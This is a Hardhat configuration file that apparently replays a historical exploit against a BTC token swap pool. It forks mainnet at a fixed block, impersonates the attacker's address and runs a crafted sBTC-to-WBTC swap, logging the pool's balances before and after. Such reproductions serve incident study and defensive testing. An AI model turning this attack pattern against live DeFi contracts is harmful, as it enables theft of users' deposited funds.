/**
 * @type import('hardhat/config').HardhatUserConfig
 */
require("@nomiclabs/hardhat-ethers");
const { utils, BigNumber } = require("ethers");

const swapAbi = require("./abi/swap.json");
const ERC20Abi = require("./abi/ERC20.json");

if (!process.env.PROVIDER_URL) {
  console.log("Set PROVIDER_URL in env");
  process.exit();
}

task("exploit", async (taskArguments, hre) => {
  const attacker = "0x09641015fb8b08388a7367b946e634d37dddffaa"
  const swapAddress = "0x4f6a43ad7cba042606decaca730d4ce0a57ac62e"

  const sBtc = await ethers.getContractAt(
    ERC20Abi,
    "0xfe18be6b3bd88a2d2a7f928d00292e7a9963cfc6"
  );
  const WBtc = await ethers.getContractAt(
    ERC20Abi,
    "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
  );
  const renBtc = await ethers.getContractAt(
    ERC20Abi,
    "0xeb4c2781e4eba804ce9a9803c67d0893436bb27d"
  );

  const swap = await ethers.getContractAt(swapAbi, swapAddress);

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [attacker],
  });
  const attackerSigner = await ethers.provider.getSigner(attacker);

  const getContractBalances = async () => {
    console.log("sBtc balance: ", utils.formatUnits(await sBtc.balanceOf(swap.address), 18))
    console.log("WBtc balance: ", utils.formatUnits(await WBtc.balanceOf(swap.address), 8))
    console.log("renBtc balance: ", utils.formatUnits(await renBtc.balanceOf(swap.address), 8))
  }

  console.log("Contract balances before the swap:")
  await getContractBalances()

  /**
   * @notice Swap two tokens using this pool
   * @param tokenIndexFrom the token the user wants to swap from
   * @param tokenIndexTo the token the user wants to swap to
   * @param dx the amount of tokens the user wants to swap from
   * @param minDy the min amount the user would like to receive, or revert.
   * @param deadline latest timestamp to accept this transaction
   */
  await swap.connect(attackerSigner).swap(
    3, //sBtc
    1, //Wbtc
    utils.parseUnits("0.343289805610305729", 18), //sBtc
    utils.parseUnits("4.31895235", 8), //wBtc
    Math.round(new Date().getTime() / 1000 + 1000)
  )

  console.log("Contract balances after the swap:")
  await getContractBalances()
});

module.exports = {
  solidity: "0.5.11",
  networks: {
    hardhat: {
      forking: {
        url: process.env.PROVIDER_URL, 
        blockNumber: 11686742
      },
    },
  }
};
